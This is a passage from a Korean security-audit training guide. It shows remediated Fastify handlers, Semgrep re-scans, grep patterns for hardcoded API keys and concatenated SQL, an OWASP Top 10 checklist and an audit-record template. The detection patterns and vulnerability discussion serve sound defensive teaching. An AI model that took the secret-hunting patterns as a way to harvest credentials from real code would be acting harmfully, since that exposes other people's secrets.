      error: { code: 'ACCESS_DENIED', message: '허용된 경로가 아닙니다' },
    })
    return
  }

  const fs = await import('fs/promises')
  const content = await fs.readFile(resolvedPath, 'utf-8')
  await reply.send(content)
}

// ✅ 수정 10: adminActionHandler — 하드코딩 우회 제거
export async function adminActionHandler(
  request: FastifyRequest,
  reply: FastifyReply,
): Promise<void> {
  // 정상적인 인증 + 권한 검사로 교체 (CSAP D-08)
  await requireAuth(request, reply)
  if (reply.sent) return

  const user = (request as any).user

  if (user.role !== 'SUPER_ADMIN') {
    await reply.status(403).send({
      success: false,
      error: { code: 'FORBIDDEN', message: '최고 관리자 권한이 필요합니다' },
    })
    return
  }

  // 감사 로그 (CSAP D-06) — 관리자 행위는 반드시 기록
  await auditLog({
    actor: user.id,
    action: 'ADMIN_ACTION',
    target: 'system',
    ip: request.ip,
    metadata: { action: 'admin-operation' },
  })

  await reply.send({ success: true, data: { message: '관리자 작업 완료' } })
}
```

---

## 7. 수정 후 재검증

### Semgrep 재실행

```bash
# 수정된 파일로 재스캔
semgrep --config=auto /tmp/security-audit-lab/fixed-api.ts

# 취약한 파일 vs 수정된 파일 비교
echo "=== 취약한 파일 결과 ==="
semgrep --config=auto /tmp/security-audit-lab/vulnerable-api.ts 2>&1 | grep -c "Finding"

echo "=== 수정된 파일 결과 ==="
semgrep --config=auto /tmp/security-audit-lab/fixed-api.ts 2>&1 | grep -c "Finding"
```

### 시크릿 스캔 재실행

```bash
# 수정된 파일에서 하드코딩 시크릿 확인
grep -n "sk-ant\|password.*=.*['\"].*[a-zA-Z0-9]\|secret.*=.*['\"]" \
  /tmp/security-audit-lab/fixed-api.ts
# → 결과 없음이 되어야 합니다
```

### SQL 인젝션 재확인

```bash
# 수정된 파일에서 SQL 문자열 결합 확인
grep -n "\`SELECT.*\${" /tmp/security-audit-lab/fixed-api.ts
# → 결과 없음이 되어야 합니다

# 매개변수화 쿼리 확인
grep -n "pool.query.*\$1" /tmp/security-audit-lab/fixed-api.ts
# → 모든 쿼리가 $1 형식의 바인딩을 사용해야 합니다
```

---

## 8. Q-Gate G5 자가 평가

Q-Gate G5는 OWASP Top 10 기준으로 코드를 자가 평가하는 단계입니다.

```mermaid
flowchart LR
    subgraph "Q-Gate G5 OWASP Top 10 체크"
        A01_CHECK{"A01\nBroken Access Control\n인증 preHandler 있는가?"}
        A02_CHECK{"A02\nCryptographic Failures\nbcrypt + AES-256 사용?"}
        A03_CHECK{"A03\nInjection\nZod + 매개변수화 쿼리?"}
        A05_CHECK{"A05\nMisconfiguration\n환경 변수 사용?"}
        A07_CHECK{"A07\nAuth Failures\nJWT verify + 블랙리스트?"}
        A09_CHECK{"A09\nLogging Failures\nauditLog 전수 기록?"}

        A01_CHECK -->|"예"| OK1["✅ PASS"]
        A01_CHECK -->|"아니오"| FAIL1["❌ FAIL\n인증 추가 필요"]
        A02_CHECK -->|"예"| OK2["✅ PASS"]
        A02_CHECK -->|"아니오"| FAIL2["❌ FAIL\n암호화 수정 필요"]
        A03_CHECK -->|"예"| OK3["✅ PASS"]
        A03_CHECK -->|"아니오"| FAIL3["❌ FAIL\nSQL 수정 필요"]
        A05_CHECK -->|"예"| OK5["✅ PASS"]
        A05_CHECK -->|"아니오"| FAIL5["❌ FAIL\n시크릿 제거 필요"]
        A07_CHECK -->|"예"| OK7["✅ PASS"]
        A07_CHECK -->|"아니오"| FAIL7["❌ FAIL\nJWT 수정 필요"]
        A09_CHECK -->|"예"| OK9["✅ PASS"]
        A09_CHECK -->|"아니오"| FAIL9["❌ FAIL\n감사 로그 추가 필요"]
    end

    style OK1 fill:#2E7D32,color:#fff
    style OK2 fill:#2E7D32,color:#fff
    style OK3 fill:#2E7D32,color:#fff
    style OK5 fill:#2E7D32,color:#fff
    style OK7 fill:#2E7D32,color:#fff
    style OK9 fill:#2E7D32,color:#fff
```

### G5 자가 평가 체크리스트

```
Q-Gate G5: OWASP Top 10 자가 평가

날짜: 2026-04-12
평가자: 홍길동
대상 파일: fixed-api.ts

A01: Broken Access Control
  [ ] 모든 API 엔드포인트에 requireAuth() 적용됨
  [ ] RBAC 권한 검사 (role 기반) 적용됨
  [ ] 테넌트 격리 검증 있음
  → 상태: PASS / FAIL

A02: Cryptographic Failures
  [ ] 비밀번호: bcrypt (rounds >= 10) 사용
  [ ] 민감 데이터: AES-256-GCM 암호화
  [ ] 약한 알고리즘(MD5, SHA1, DES) 미사용
  → 상태: PASS / FAIL

A03: Injection (SQL + XSS)
  [ ] SQL: 매개변수화 쿼리만 사용 ($1, $2...)
  [ ] XSS: HTML 이스케이프 또는 CSP 헤더 적용
  [ ] 입력: Zod 스키마 검증 적용
  → 상태: PASS / FAIL

A05: Security Misconfiguration
  [ ] 하드코딩 시크릿 없음
  [ ] 에러 스택 트레이스 미노출
  [ ] 개발/프로덕션 설정 분리
  → 상태: PASS / FAIL

A07: Identification and Authentication Failures
  [ ] JWT: jwt.verify() 사용 (jwt.decode() 금지)
  [ ] 토큰 만료: 15분 이하
  [ ] 블랙리스트 확인
  → 상태: PASS / FAIL

A09: Security Logging and Monitoring Failures
  [ ] 로그인 성공/실패 감사 로그
  [ ] 권한 검사 실패 감사 로그
  [ ] 민감 정보(비밀번호) 로그 미포함
  → 상태: PASS / FAIL

전체 G5 결과: PASS (6/6) / PARTIAL (일부 FAIL 있음) / FAIL (절반 이상 FAIL)
```

---

## 9. 보안 감사 결과를 PDCA에 기록하기

### PDCA 보안 감사 문서 구조

실제 프로젝트에서는 보안 감사 결과를 PDCA 문서에 기록하여 감리 증거로 활용합니다.

```markdown
# 보안 감사 결과 기록 — PDCA Plan 문서에 포함

## 보안 감사 수행 기록

**감사 방법**: Semgrep 자동 스캔 + 수동 코드 리뷰
**감사 기준**: OWASP Top 10 2021 + CSAP D-08/09/12
**감사 범위**: platform/services/auth-service/src/**

## 취약점 발견 및 조치 결과

| 취약점 ID | 심각도 | OWASP | CSAP | 발견일 | 조치일 | 상태 |
|---------|--------|-------|------|--------|--------|------|
| SEC-001 | Critical | A03 | D-12 | 2026-04-12 | 2026-04-12 | 수정 완료 |
| SEC-002 | High | A09 | D-06 | 2026-04-12 | 2026-04-12 | 수정 완료 |

## Q-Gate G5 결과

**PASS**: A01, A02, A03, A05, A07, A09 모두 충족
**검증 방법**: Semgrep 재스캔 결과 0건 + 수동 검토 완료
**검증자**: 홍길동

## 추적성 매트릭스

| CSAP 항목 | 검증 방법 | 증거 파일 | 상태 |
|---------|---------|---------|------|
| D-08 접근 통제 | requireAuth() 코드 리뷰 | fixed-api.ts | 적합 |
| D-09 암호화 | bcrypt + env var 검토 | fixed-api.ts | 적합 |
| D-12 개발 보안 | Semgrep 스캔 결과 | semgrep-report.json | 적합 |
```

### 감사 결과 파일 저장

```bash
# Semgrep 결과를 JSON으로 저장 (감리 증거용)
semgrep --config=auto \
  --json \
  /tmp/security-audit-lab/fixed-api.ts \
  > /tmp/security-audit-lab/semgrep-report-fixed.json

# 결과 요약
cat /tmp/security-audit-lab/semgrep-report-fixed.json | \
  python3 -c "import json,sys; d=json.load(sys.stdin); print(f'발견된 취약점: {len(d[\"results\"])}건')"
```

---

## 학습 체크리스트

### 도구 사용

- [ ] Semgrep을 설치하고 취약한 샘플 코드를 스캔했다
- [ ] Semgrep 결과를 보고 심각도(ERROR/WARNING/INFO)를 구분했다
- [ ] 프로젝트 전용 Semgrep 규칙을 직접 작성했다
- [ ] 수동으로 `grep`을 사용하여 하드코딩 시크릿을 탐지했다

### 취약점 이해

- [ ] 샘플 코드에서 10개 취약점을 모두 찾았다
- [ ] 각 취약점의 OWASP 번호와 CSAP 항목을 매핑했다
- [ ] SQL 인젝션 공격 시뮬레이션을 이해했다
- [ ] XSS 공격 원리를 설명할 수 있다
- [ ] Path Traversal이 무엇인지 설명할 수 있다

### 수정 및 검증

- [ ] 10개 취약점을 모두 안전한 코드로 수정했다
- [ ] Semgrep 재스캔으로 취약점 제거를 검증했다
- [ ] Q-Gate G5 자가 평가 체크리스트를 완성했다

### 문서화

- [ ] CVSS 점수를 직접 계산했다
- [ ] 취약점 보고서 템플릿을 채워 작성했다
- [ ] 보안 감사 결과를 PDCA 문서 형식으로 기록했다

---

## 다음 단계

보안 감사 능력을 갖추었습니다. 더 심화 학습을 원한다면.

- `07-security/README.md` — 보안 가이드 전체 목록
- `.claude/rules/csap-compliance.md` — CSAP 79개 통제 항목 전체
- `07-assessment.md` — 온보딩 최종 역량 평가

**실제 프로젝트 적용**: 본인이 담당하는 서비스에 Semgrep 스캔을 실행하고
결과를 PR 설명에 첨부하는 것을 습관화하십시오.

---

## 변경 이력

| 버전 | 일자 | 내용 | 작성자 |
|------|------|------|------|
| 1.0.0 | 2026-04-12 | 최초 작성 — Semgrep + 수동 감사 실습 | Implementer (Sonnet) |
